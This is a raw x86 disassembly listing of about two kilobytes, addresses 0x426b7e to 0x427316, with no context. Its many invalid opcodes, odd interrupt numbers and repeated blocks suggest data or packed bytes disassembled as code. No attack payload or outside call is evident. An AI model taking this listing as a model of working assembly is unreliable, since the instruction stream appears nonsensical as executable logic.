  426b7e:	xor    BYTE PTR [ebx],bh
  426b80:	psrlq  mm5,mm3
  426b83:	xchg   edx,eax
  426b84:	add    al,0xf8
  426b86:	call   ebx
  426b88:	jmp    0x8832beb5
  426b8d:	jge    0x426b47
  426b8f:	int    0xcc
  426b91:	lea    esi,[eax+0x0]
  426b94:	add    BYTE PTR [eax],al
  426b96:	mov    eax,0xd3b8e3f8
  426b9b:	repnz das 
  426b9d:	mov    eax,0x53b8f3e3
  426ba2:	jecxz  0x426b71
  426ba4:	lea    esi,[eax]
  426ba6:	int    0xe6
  426ba8:	xor    BYTE PTR [ebx],bh
  426baa:	psrlq  mm5,mm3
  426bad:	xchg   edx,eax
  426bae:	add    al,0xf8
  426bb0:	call   ebx
  426bb2:	jmp    0x8832bedf
  426bb7:	jge    0x426b71
  426bb9:	or     dl,BYTE PTR ds:0x708d
  426bbf:	add    ch,cl
  426bc1:	lea    esi,[eax]
  426bc3:	int    0x96
  426bc5:	xor    BYTE PTR [ebx],bh
  426bc7:	(bad)  
  426bc9:	sti    
  426bca:	call   ebx
  426bcc:	jmp    0x426b60
  426bce:	shr    edx,cl
  426bd0:	sub    BYTE PTR [ebx+0x13],dl
  426bd3:	int    0x96
  426bd5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426bdb:	add    al,0x2
  426bdd:	(bad)  
  426bde:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426be4:	repz xchg edx,eax
  426be6:	push   ebx
  426be7:	jecxz  0x426c24
  426be9:	retf   
  426bea:	add    al,0xd2
  426bec:	sbb    bl,BYTE PTR [ebx]
  426bee:	retf   
  426bef:	cmp    eax,DWORD PTR [eax]
  426bf1:	inc    ebx
  426bf2:	cli    
  426bf3:	das    
  426bf4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bfa:	pop    es
  426bfb:	pop    ebx
  426bfc:	add    BYTE PTR [eax],al
  426bfe:	add    bl,al
  426c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c01:	mov    esi,0x76cf4229
  426c06:	jne    0x426c12
  426c08:	jbe    0x426b92
  426c0a:	int    0x76
  426c0c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c12:	or     bl,BYTE PTR [ecx+ecx*8]
  426c15:	ins    BYTE PTR es:[edi],dx
  426c16:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c1c:	jbe    0x426c93
  426c1e:	int    0x8d
  426c20:	jge    0x426c51
  426c22:	inc    ebp
  426c23:	jge    0x426bb7
  426c25:	shr    ebx,cl
  426c27:	xchg   edx,eax
  426c28:	int    0x8d
  426c2a:	jne    0x426bf9
  426c2c:	xchg   esi,eax
  426c2d:	jge    0x426c6a
  426c2f:	leave  
  426c30:	cmp    ebx,edx
  426c32:	push   ebx
  426c33:	icebp  
  426c34:	int    0x76
  426c36:	cmc    
  426c37:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c3d:	jo     0x426c0e
  426c3f:	push   es
  426c40:	cmc    
  426c41:	inc    DWORD PTR [eax]
  426c43:	add    BYTE PTR [eax-0x2d],dh
  426c46:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c4d:	int    0x76
  426c4f:	in     eax,dx
  426c50:	int    0x8d
  426c52:	adc    DWORD PTR [edi],ebp
  426c54:	inc    ebp
  426c55:	jge    0x426be9
  426c57:	shr    ebx,cl
  426c59:	xchg   edx,eax
  426c5a:	int    0x8d
  426c5c:	in     eax,dx
  426c5d:	int    0x96
  426c5f:	adc    ebx,edx
  426c61:	repnz sub ch,cl
  426c64:	iret   
  426c65:	cmc    
  426c66:	inc    DWORD PTR [eax]
  426c68:	add    ch,cl
  426c6a:	mov    DWORD PTR [ebx],edi
  426c6c:	leave  
  426c6d:	cmp    ebx,edx
  426c6f:	push   ebx
  426c70:	rol    BYTE PTR [ebx+0x7d],cl
  426c73:	das    
  426c74:	push   es
  426c75:	push   ebp
  426c76:	add    BYTE PTR [eax-0xa293280],0xc9
  426c7d:	jbe    0x426c8c
  426c7f:	(bad)  
  426c80:	ficom  WORD PTR ss:[ebx]
  426c83:	pop    ebp
  426c84:	mov    ebp,0xa25230a
  426c89:	jbe    0x426c7c
  426c8b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c91:	int    0x76
  426c93:	xchg   ebp,eax
  426c94:	int    0x8d
  426c96:	popf   
  426c97:	das    
  426c98:	inc    ebp
  426c99:	jge    0x426c2d
  426c9b:	shr    ebx,cl
  426c9d:	xchg   edx,eax
  426c9e:	int    0x8d
  426ca0:	xchg   ebp,eax
  426ca1:	int    0x96
  426ca3:	popf   
  426ca4:	cmp    ecx,ecx
  426ca6:	cmp    ebx,edx
  426ca8:	push   ebx
  426ca9:	icebp  
  426caa:	bound  eax,QWORD PTR [eax]
  426cac:	(bad)  
  426cad:	xor    al,0xd3
  426caf:	repnz sub BYTE PTR [eax],al
  426cb2:	pop    ecx
  426cb3:	xor    eax,0xbd808081
  426cb8:	push   eax
  426cb9:	repnz add BYTE PTR [eax],al
  426cbc:	int    0x76
  426cbe:	xchg   ebp,eax
  426cbf:	int    0x8d
  426cc1:	popf   
  426cc2:	das    
  426cc3:	inc    ebp
  426cc4:	jge    0x426c58
  426cc6:	shr    ebx,cl
  426cc8:	xchg   edx,eax
  426cc9:	int    0x8d
  426ccb:	xchg   ebp,eax
  426ccc:	int    0x96
  426cce:	popf   
  426ccf:	cmp    ecx,ecx
  426cd1:	cmp    ebx,edx
  426cd3:	push   ebx
  426cd4:	icebp  
  426cd5:	bound  eax,QWORD PTR [eax]
  426cd7:	pop    ecx
  426cd8:	xor    eax,0xd3808081
  426cdd:	repnz sub BYTE PTR [eax],al
  426ce0:	pop    ecx
  426ce1:	sub    eax,0xbd808081
  426ce6:	xchg   edx,eax
  426ce7:	repnz add BYTE PTR [eax],al
  426cea:	int    0x7
  426cec:	xor    eax,0xcd808081
  426cf1:	mov    ch,cl
  426cf3:	jle    0x426d59
  426cf5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cfb:	lea    ecx,ds:0x2ff176cd
  426d01:	inc    ebp
  426d02:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d08:	jbe    0x426d17
  426d0a:	int    0x96
  426d0c:	icebp  
  426d0d:	cmp    esi,eax
  426d0f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d15:	ror    ebp,cl
  426d17:	lea    ecx,[eax+0x187ebb2f]
  426d1d:	push   es
  426d1e:	jge    0x426cf4
  426d20:	dec    esp
  426d21:	int    0x7
  426d23:	popf   
  426d24:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d2e:	jbe    0x426d7c
  426d30:	int    0x76
  426d32:	xor    BYTE PTR [eax],al
  426d34:	(bad)  
  426d35:	cmp    al,0x0
  426d37:	(bad)  
  426d38:	cmc    
  426d39:	add    dh,dl
  426d3b:	sub    al,0x0
  426d3d:	(bad)  
  426d3e:	and    al,0x0
  426d40:	(bad)  
  426d41:	sbb    al,0x0
  426d43:	(bad)  
  426d44:	adc    al,0xbd
  426d46:	test   ch,dh
  426d48:	add    BYTE PTR [eax],al
  426d4a:	or     al,BYTE PTR [esi]
  426d4c:	adc    edi,edi
  426d4e:	add    BYTE PTR [eax],al
  426d50:	int    0x76
  426d52:	cmp    al,0x4
  426d54:	fcom   QWORD PTR [eax+eax*4]
  426d57:	aam    0x1a
  426d59:	int    0x76
  426d5b:	cmp    al,0x4
  426d5d:	fsub   QWORD PTR [eax+eax*4]
  426d60:	aam    0x4e
  426d62:	int    0x6
  426d64:	adc    edi,edi
  426d66:	add    BYTE PTR [eax],al
  426d68:	int    0x8d
  426d6a:	cmp    al,0xa
  426d6c:	outs   dx,BYTE PTR ds:[esi]
  426d6d:	sbb    al,0xec
  426d6f:	push   ebx
  426d70:	add    dh,dl
  426d72:	cmp    al,0x0
  426d74:	(bad)  
  426d75:	cmc    
  426d76:	mov    ebp,0x6daa
  426d7b:	stos   BYTE PTR es:[edi],al
  426d7c:	test   al,0x63
  426d7e:	retf   
  426d7f:	shl    BYTE PTR [eax+eax*4],cl
  426d82:	xchg   esi,eax
  426d83:	int    0xed
  426d85:	jno    0x426df8
  426d87:	cwde   
  426d88:	leave  
  426d89:	jbe    0x426d88
  426d8b:	dec    ecx
  426d8c:	and    DWORD PTR [esi-0x68936cb],eax
  426d92:	inc    ecx
  426d93:	and    DWORD PTR [esi-0x28932cb],eax
  426d99:	int    0xd6
  426d9b:	std    
  426d9c:	sar    bh,0x5f
  426d9f:	shl    DWORD PTR [ecx],1
  426da1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426da7:	sti    
  426da8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dae:	push   ebx
  426daf:	jns    0x426d7e
  426db1:	(bad)  
  426db2:	mov    BYTE PTR [ebx+0x11],al
  426db5:	int    0x76
  426db7:	std    
  426db8:	aam    0xc4
  426dba:	int    0xd6
  426dbc:	std    
  426dbd:	cmp    edx,ebx
  426dbf:	cmp    edi,ebx
  426dc1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426dc7:	push   ebx
  426dc8:	jns    0x426d97
  426dca:	(bad)  
  426dcb:	dec    esp
  426dcc:	inc    ebx
  426dcd:	adc    esp,edx
  426dcf:	pop    ebx
  426dd0:	int    0x96
  426dd2:	xor    BYTE PTR [edx-0x32b31933],bl
  426dd8:	jbe    0x426d62
  426dda:	cmp    esi,edi
  426ddc:	push   es
  426ddd:	add    ah,dl
  426ddf:	push   esi
  426de0:	pop    ebx
  426de1:	retf   0x8624
  426de4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dea:	das    
  426deb:	push   es
  426dec:	fcmovbe st,st(6)
  426dee:	dec    esi
  426def:	add    al,0xf4
  426df1:	adc    DWORD PTR [edx],0xffffffc5
  426df4:	fwait
  426df5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426dfc:	dec    esp
  426dfd:	adc    ch,ah
  426dff:	in     eax,dx
  426e00:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e07:	lea    ebp,[edi]
  426e09:	retf   0x2fa6
  426e0c:	or     DWORD PTR [esi+eax*4],esp
  426e0f:	js     0x426e54
  426e11:	clc    
  426e12:	or     BYTE PTR [esi],0x63
  426e15:	int    0x76
  426e17:	stc    
  426e18:	cmp    edx,ebx
  426e1a:	int    0x8d
  426e1c:	stc    
  426e1d:	add    al,0x2
  426e1f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e25:	std    
  426e26:	cmp    edx,ebx
  426e28:	int    0x8d
  426e2a:	std    
  426e2b:	cmp    edx,DWORD PTR [ebx]
  426e2d:	shl    edx,cl
  426e2f:	sub    bl,dl
  426e31:	mov    ebp,0xa8d35392
  426e36:	retf   
  426e37:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e3b:	int    0xed
  426e3d:	add    al,0xed
  426e3f:	(bad)  
  426e40:	leave  
  426e41:	jbe    0x426e40
  426e43:	dec    ecx
  426e44:	and    DWORD PTR [esi+0x21416135],eax
  426e4a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e50:	jbe    0x426e66
  426e52:	or     dh,BYTE PTR [esi+0x14]
  426e55:	int    0x76
  426e57:	adc    al,0xcd
  426e59:	add    DWORD PTR ds:0xcd808081,ebp
  426e5f:	lea    edx,[ecx*8+0x2d0acd80]
  426e66:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e70:	lea    esi,[ebp-0x32028933]
  426e76:	(bad)  
  426e77:	std    
  426e78:	cwde   
  426e79:	call   0x3b85:0x82cfffc0
  426e80:	jns    0x426e55
  426e82:	mov    ebp,0xf03baa92
  426e87:	shl    edx,cl
  426e89:	sub    BYTE PTR [ebx-0x2d],dl
  426e8c:	or     dh,BYTE PTR [esi-0x63]
  426e8f:	int    0x76
  426e91:	std    
  426e92:	int    0x8d
  426e94:	std    
  426e95:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e98:	mov    ebp,0xd3f03b92
  426e9d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426ea1:	or     dh,BYTE PTR [esi-0x53]
  426ea4:	int    0x76
  426ea6:	mov    ch,0xcd
  426ea8:	ins    BYTE PTR es:[edi],dx
  426ea9:	jo     0x426eaf
  426eab:	mov    ebp,0xf1760a4c
  426eb0:	int    0x76
  426eb2:	mov    ch,0xcd
  426eb4:	ins    BYTE PTR es:[edi],dx
  426eb5:	pop    esp
  426eb6:	int    0x8d
  426eb8:	mov    ch,0x7c
  426eba:	push   es
  426ebb:	outs   dx,BYTE PTR ds:[esi]
  426ebc:	xchg   esp,eax
  426ebd:	int    0x76
  426ebf:	mov    ch,0xd4
  426ec1:	sbb    al,0xcd
  426ec3:	ins    BYTE PTR es:[edi],dx
  426ec4:	pop    esp
  426ec5:	int    0x8d
  426ec7:	mov    ch,0xcd
  426ec9:	jle    0x426e5f
  426ecb:	jl     0x426ec5
  426ecd:	icebp  
  426ece:	sub    edi,DWORD PTR [ebp-0x33]
  426ed1:	jbe    0x426e88
  426ed3:	int    0x6c
  426ed5:	pop    esp
  426ed6:	xchg   ebx,edx
  426ed8:	in     al,dx
  426ed9:	xchg   ebp,ecx
  426edb:	ins    BYTE PTR es:[edi],dx
  426edc:	xchg   esp,eax
  426edd:	or     dh,BYTE PTR [esi-0x43]
  426ee0:	int    0x76
  426ee2:	std    
  426ee3:	int    0x8d
  426ee5:	std    
  426ee6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ee9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ef0:	push   ebx
  426ef1:	ror    DWORD PTR [edx],cl
  426ef3:	jbe    0x426f09
  426ef5:	int    0x76
  426ef7:	std    
  426ef8:	int    0x8d
  426efa:	std    
  426efb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426efe:	lock shl edx,cl
  426f01:	sub    bl,dl
  426f03:	mov    ebp,0xad35392
  426f08:	jbe    0x426f1e
  426f0a:	int    0x76
  426f0c:	std    
  426f0d:	int    0x8d
  426f0f:	std    
  426f10:	cmp    esi,eax
  426f12:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f15:	repnz sub bl,dl
  426f18:	mov    ebp,0xcdd35392
  426f1d:	lea    esi,[eax]
  426f1f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f25:	jbe    0x426f3b
  426f27:	cmp    DWORD PTR [ecx],esp
  426f29:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f2f:	and    DWORD PTR [esi+0x1476c935],eax
  426f35:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f3b:	xchg   BYTE PTR [eax-0x2893280],al
  426f41:	int    0x8d
  426f43:	std    
  426f44:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f47:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f4e:	push   ebx
  426f4f:	ror    DWORD PTR [edx],cl
  426f51:	jbe    0x426f00
  426f53:	int    0x76
  426f55:	mov    ebp,0xa4c7687
  426f5a:	jbe    0x426ef9
  426f5c:	add    dh,dl
  426f5e:	popf   
  426f5f:	add    dh,dl
  426f61:	dec    esp
  426f62:	int    0x8d
  426f64:	mov    ch,0xbd
  426f66:	neg    bh
  426f68:	add    BYTE PTR [eax],al
  426f6a:	or     dh,BYTE PTR [esi+0x14]
  426f6d:	int    0x76
  426f6f:	adc    al,0x6
  426f71:	ins    DWORD PTR es:[edi],dx
  426f72:	aam    0x60
  426f74:	int    0x76
  426f76:	popf   
  426f77:	or     dh,BYTE PTR [esi-0x5b]
  426f7a:	int    0x76
  426f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f7d:	int    0x8d
  426f7f:	dec    esp
  426f80:	xor    edx,ebx
  426f82:	or     dh,BYTE PTR [esi-0x5b]
  426f85:	int    0x76
  426f87:	adc    al,0xcd
  426f89:	lea    edx,[ecx*8+0x6e87306c]
  426f90:	dec    esp
  426f91:	int    0x8d
  426f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f94:	inc    ebx
  426f95:	jge    0x426f19
  426f97:	sbb    ch,cl
  426f99:	jbe    0x426faf
  426f9b:	int    0x6c
  426f9d:	dec    esp
  426f9e:	int    0x8d
  426fa0:	adc    al,0x87
  426fa2:	outs   dx,BYTE PTR ds:[esi]
  426fa3:	mov    ch,cl
  426fa5:	lea    esp,[ebp-0x2e142ccd]
  426fab:	test   DWORD PTR [eax+0x2149bf80],eax
  426fb1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426fb7:	jbe    0x427036
  426fb9:	inc    ecx
  426fba:	and    DWORD PTR [esi+0x7576c935],eax
  426fc0:	cmp    DWORD PTR [ecx],esp
  426fc2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fc8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fce:	or     dh,BYTE PTR [esi-0xb]
  426fd1:	iret   
  426fd2:	jbe    0x427051
  426fd4:	or     dh,BYTE PTR [esi+0x11]
  426fd7:	iret   
  426fd8:	jbe    0x42704f
  426fda:	or     dh,BYTE PTR [esi+0x14]
  426fdd:	iret   
  426fde:	jbe    0x42704d
  426fe0:	or     dh,BYTE PTR [esi-0x13]
  426fe3:	int    0x76
  426fe5:	std    
  426fe6:	int    0x8d
  426fe8:	std    
  426fe9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fec:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ff3:	push   ebx
  426ff4:	ror    DWORD PTR [edx],cl
  426ff6:	jbe    0x426f9d
  426ff8:	jmp    0x42700d
  426ffa:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427000:	and    DWORD PTR [esi-0x22fad0cb],eax
  427006:	xchg   DWORD PTR [eax+0x4cc080],eax
  42700c:	(bad)  
  42700d:	popf   
  42700e:	iret   
  42700f:	jbe    0x426fe1
  427011:	jo     0x426fd0
  427013:	xlat   BYTE PTR ds:[ebx]
  427014:	fild   WORD PTR [eax]
  427016:	add    ch,cl
  427018:	jbe    0x427013
  42701a:	int    0x8d
  42701c:	stc    
  42701d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427020:	lock shl edx,cl
  427023:	sub    bl,dl
  427025:	mov    ebp,0xad35392
  42702a:	jbe    0x426fd9
  42702c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427032:	int    0x76
  427034:	xchg   ebp,eax
  427035:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42703b:	in     eax,0x28
  42703d:	push   ebx
  42703e:	popf   
  42703f:	or     ah,BYTE PTR [esi-0x689325b]
  427045:	int    0x8d
  427047:	stc    
  427048:	cmp    esi,eax
  42704a:	shl    edx,cl
  42704c:	sub    BYTE PTR [ebx],bh
  42704e:	jns    0x427023
  427050:	mov    ebp,0xcdd35392
  427055:	(bad)  
  427056:	stc    
  427057:	int    0x96
  427059:	stc    
  42705a:	cmp    ecx,DWORD PTR [edi]
  42705c:	cmp    ebx,ecx
  42705e:	shr    ebx,cl
  427060:	xchg   edx,eax
  427061:	shr    edx,cl
  427063:	sub    BYTE PTR [ebx+0x13],dl
  427066:	xchg   ebx,edx
  427068:	int    0x8d
  42706a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42706b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427071:	sub    ch,cl
  427073:	jbe    0x42706e
  427075:	int    0x8d
  427077:	stc    
  427078:	cmp    edi,DWORD PTR [ecx+0x3b]
  42707b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427082:	push   ebx
  427083:	shl    DWORD PTR [eax-0x40],cl
  427086:	dec    esp
  427087:	iret   
  427088:	jbe    0x42705a
  42708a:	jo     0x427049
  42708c:	sti    
  42708d:	std    
  42708e:	add    BYTE PTR [eax],al
  427090:	int    0x76
  427092:	std    
  427093:	int    0x8d
  427095:	std    
  427096:	cmp    edi,DWORD PTR [ecx+0x3b]
  427099:	lock shl edx,cl
  42709c:	sub    bl,dl
  42709e:	mov    ebp,0xcdd35392
  4270a3:	lea    esp,[ebp+0x28d47d43]
  4270a9:	int    0x76
  4270ab:	std    
  4270ac:	int    0x8d
  4270ae:	std    
  4270af:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270b2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270b9:	push   ebx
  4270ba:	shl    DWORD PTR [eax-0x40],cl
  4270bd:	dec    esp
  4270be:	iret   
  4270bf:	jbe    0x427091
  4270c1:	jo     0x427080
  4270c3:	mov    edi,0xcd0000fd
  4270c8:	jbe    0x4270bf
  4270ca:	int    0x8d
  4270cc:	cmc    
  4270cd:	int    0x89
  4270cf:	int    0x80
  4270d1:	cmp    esi,eax
  4270d3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270d6:	repnz sub bl,dl
  4270d9:	mov    ebp,0xcad35392
  4270de:	je     0x427065
  4270e0:	ror    ch,1
  4270e2:	(bad)  
  4270e3:	std    
  4270e4:	int    0x96
  4270e6:	std    
  4270e7:	cmp    ecx,DWORD PTR [edi]
  4270e9:	cmp    ebx,ecx
  4270eb:	shr    ebx,cl
  4270ed:	xchg   edx,eax
  4270ee:	shr    edx,cl
  4270f0:	sub    BYTE PTR [edi],ch
  4270f2:	pop    ecx
  4270f3:	ins    DWORD PTR es:[edi],dx
  4270f4:	push   ebx
  4270f5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270f8:	das    
  4270f9:	add    eax,0x80809212
  4270fe:	int    0x76
  427100:	adc    ebp,ecx
  427102:	lea    edx,[ecx]
  427104:	int    0x89
  427106:	int    0x80
  427108:	cmp    esi,eax
  42710a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42710d:	repnz sub bl,dl
  427110:	mov    ebp,0xcad35392
  427115:	je     0x42709c
  427117:	ror    ch,1
  427119:	(bad)  
  42711a:	std    
  42711b:	int    0x96
  42711d:	std    
  42711e:	cmp    ecx,DWORD PTR [edi]
  427120:	cmp    ebx,ecx
  427122:	shr    ebx,cl
  427124:	xchg   edx,eax
  427125:	shr    edx,cl
  427127:	sub    BYTE PTR [edi],ch
  427129:	pop    ecx
  42712a:	ins    DWORD PTR es:[edi],dx
  42712b:	push   ebx
  42712c:	adc    eax,DWORD PTR [ebx-0x2d]
  42712f:	das    
  427130:	add    eax,0x8080928a
  427135:	int    0x76
  427137:	adc    al,0xcd
  427139:	lea    edx,[ecx*8+0x3b80cd89]
  427140:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427144:	repnz sub bl,dl
  427147:	mov    ebp,0xcad35392
  42714c:	je     0x4270d3
  42714e:	ror    ch,1
  427150:	(bad)  
  427151:	std    
  427152:	int    0x96
  427154:	std    
  427155:	cmp    ecx,DWORD PTR [edi]
  427157:	cmp    ebx,ecx
  427159:	shr    ebx,cl
  42715b:	xchg   edx,eax
  42715c:	shr    edx,cl
  42715e:	sub    BYTE PTR [edi],ch
  427160:	pop    ecx
  427161:	ins    DWORD PTR es:[edi],dx
  427162:	push   ebx
  427163:	adc    eax,DWORD PTR [ebx-0x2d]
  427166:	das    
  427167:	add    eax,0x8080921b
  42716c:	int    0x76
  42716e:	in     eax,dx
  42716f:	int    0x8d
  427171:	in     eax,dx
  427172:	int    0x89
  427174:	int    0x80
  427176:	cmp    esi,eax
  427178:	cmp    edi,DWORD PTR [ecx-0x2d]
  42717b:	repnz sub bl,dl
  42717e:	mov    ebp,0xcad35392
  427183:	je     0x42710a
  427185:	ror    ch,1
  427187:	(bad)  
  427188:	std    
  427189:	int    0x96
  42718b:	std    
  42718c:	cmp    ecx,DWORD PTR [edi]
  42718e:	cmp    ebx,ecx
  427190:	shr    ebx,cl
  427192:	xchg   edx,eax
  427193:	shr    edx,cl
  427195:	sub    BYTE PTR [edi],ch
  427197:	pop    ecx
  427198:	ins    DWORD PTR es:[edi],dx
  427199:	push   ebx
  42719a:	adc    eax,DWORD PTR [ebx-0x2d]
  42719d:	das    
  42719e:	add    eax,0x808081a5
  4271a3:	int    0x76
  4271a5:	adc    ebp,ecx
  4271a7:	lea    edx,[ecx]
  4271a9:	int    0x89
  4271ab:	int    0x80
  4271ad:	cmp    esi,eax
  4271af:	shl    edx,cl
  4271b1:	sub    BYTE PTR [ebx],bh
  4271b3:	jns    0x427188
  4271b5:	mov    ebp,0xcad35392
  4271ba:	je     0x427141
  4271bc:	ror    ch,1
  4271be:	(bad)  
  4271bf:	cmc    
  4271c0:	int    0x89
  4271c2:	int    0x96
  4271c4:	cmc    
  4271c5:	int    0x22
  4271c7:	cmp    ecx,DWORD PTR [edi]
  4271c9:	shr    ebx,cl
  4271cb:	xchg   edx,eax
  4271cc:	cmp    ebx,ecx
  4271ce:	shr    edx,cl
  4271d0:	sub    BYTE PTR [ebx+0x13],dl
  4271d3:	retf   0x4d8c
  4271d6:	rol    BYTE PTR [edx-0x2d],1
  4271d9:	int    0x8d
  4271db:	adc    al,0xcd
  4271dd:	mov    ebp,ecx
  4271df:	xchg   esi,eax
  4271e0:	adc    al,0xcd
  4271e2:	and    bh,BYTE PTR [ebx]
  4271e4:	psrlq  mm5,mm3
  4271e7:	xchg   edx,eax
  4271e8:	cmp    ebx,ecx
  4271ea:	shr    edx,cl
  4271ec:	sub    BYTE PTR [ebx+0x13],dl
  4271ef:	retf   0x4d8c
  4271f2:	ror    BYTE PTR [edx-0x2d],1
  4271f5:	int    0x8d
  4271f7:	cmc    
  4271f8:	int    0x89
  4271fa:	int    0x96
  4271fc:	cmc    
  4271fd:	int    0x22
  4271ff:	cmp    ecx,DWORD PTR [edi]
  427201:	cmp    ebx,ecx
  427203:	shr    ebx,cl
  427205:	xchg   edx,eax
  427206:	shr    edx,cl
  427208:	sub    BYTE PTR [ebx+0x13],dl
  42720b:	retf   0x4d8c
  42720e:	push   ebp
  42720f:	pusha  
  427210:	jge    0x427241
  427212:	push   es
  427213:	mov    esp,0xcd808081
  427218:	jbe    0x42722e
  42721a:	int    0x8d
  42721c:	adc    al,0xcd
  42721e:	mov    ebp,ecx
  427220:	cmp    BYTE PTR [ebx],0xf0
  427223:	shl    edx,cl
  427225:	sub    BYTE PTR [ebx],bh
  427227:	jns    0x4271fc
  427229:	mov    ebp,0xcad35392
  42722e:	je     0x4271b5
  427230:	ror    ch,1
  427232:	lea    edx,[ecx]
  427234:	int    0x89
  427236:	int    0x96
  427238:	adc    ebp,ecx
  42723a:	and    bh,BYTE PTR [ebx]
  42723c:	psrlq  mm5,mm3
  42723f:	xchg   edx,eax
  427240:	cmp    ebx,ecx
  427242:	shr    edx,cl
  427244:	sub    BYTE PTR [ebx+0x13],dl
  427247:	retf   0x4d8c
  42724a:	rol    BYTE PTR [edx-0x2d],1
  42724d:	int    0x8d
  42724f:	in     eax,dx
  427250:	int    0x89
  427252:	int    0x96
  427254:	in     eax,dx
  427255:	int    0x22
  427257:	cmp    ecx,DWORD PTR [edi]
  427259:	shr    ebx,cl
  42725b:	xchg   edx,eax
  42725c:	cmp    ebx,ecx
  42725e:	shr    edx,cl
  427260:	sub    BYTE PTR [ebx+0x13],dl
  427263:	retf   0x4d8c
  427266:	ror    BYTE PTR [edx-0x2d],1
  427269:	int    0x8d
  42726b:	adc    ebp,ecx
  42726d:	mov    ebp,ecx
  42726f:	xchg   esi,eax
  427270:	adc    ebp,ecx
  427272:	and    bh,BYTE PTR [ebx]
  427274:	(bad)  
  427276:	(bad)  
  427278:	jmp    0x42720c
  42727a:	shr    edx,cl
  42727c:	sub    BYTE PTR [ebx+0x13],dl
  42727f:	retf   0x4d8c
  427282:	push   ebp
  427283:	pusha  
  427284:	jge    0x4272b5
  427286:	push   es
  427287:	cmc    
  427288:	add    BYTE PTR [eax-0x12893280],0xcd
  42728f:	(bad)  
  427290:	in     eax,dx
  427291:	int    0x89
  427293:	int    0x80
  427295:	cmp    esi,eax
  427297:	shl    edx,cl
  427299:	sub    BYTE PTR [ebx],bh
  42729b:	jns    0x427270
  42729d:	mov    ebp,0xcad35392
  4272a2:	je     0x427229
  4272a4:	ror    ch,1
  4272a6:	lea    edx,[ecx*8+0x1496cd89]
  4272ad:	int    0x22
  4272af:	cmp    ecx,DWORD PTR [edi]
  4272b1:	shr    ebx,cl
  4272b3:	xchg   edx,eax
  4272b4:	cmp    ebx,ecx
  4272b6:	shr    edx,cl
  4272b8:	sub    BYTE PTR [ebx+0x13],dl
  4272bb:	retf   0x4d8c
  4272be:	rol    BYTE PTR [edx-0x2d],1
  4272c1:	int    0x8d
  4272c3:	cmc    
  4272c4:	int    0x89
  4272c6:	int    0x96
  4272c8:	cmc    
  4272c9:	int    0x22
  4272cb:	cmp    ecx,DWORD PTR [edi]
  4272cd:	shr    ebx,cl
  4272cf:	xchg   edx,eax
  4272d0:	cmp    ebx,ecx
  4272d2:	shr    edx,cl
  4272d4:	sub    BYTE PTR [ebx+0x13],dl
  4272d7:	retf   0x4d8c
  4272da:	ror    BYTE PTR [edx-0x2d],1
  4272dd:	int    0x8d
  4272df:	adc    al,0xcd
  4272e1:	mov    ebp,ecx
  4272e3:	xchg   esi,eax
  4272e4:	adc    al,0xcd
  4272e6:	and    bh,BYTE PTR [ebx]
  4272e8:	(bad)  
  4272ea:	(bad)  
  4272ec:	jmp    0x427280
  4272ee:	shr    edx,cl
  4272f0:	sub    BYTE PTR [ebx+0x13],dl
  4272f3:	retf   0x4d8c
  4272f6:	push   ebp
  4272f7:	pusha  
  4272f8:	jge    0x427329
  4272fa:	push   es
  4272fb:	add    DWORD PTR [eax+0x76cd8080],eax
  427301:	in     eax,dx
  427302:	int    0x8d
  427304:	in     eax,dx
  427305:	int    0x89
  427307:	int    0x80
  427309:	cmp    esi,eax
  42730b:	shl    edx,cl
  42730d:	sub    BYTE PTR [ebx],bh
  42730f:	jns    0x4272e4
  427311:	mov    ebp,0xcad35392
  427316:	je     0x42729d
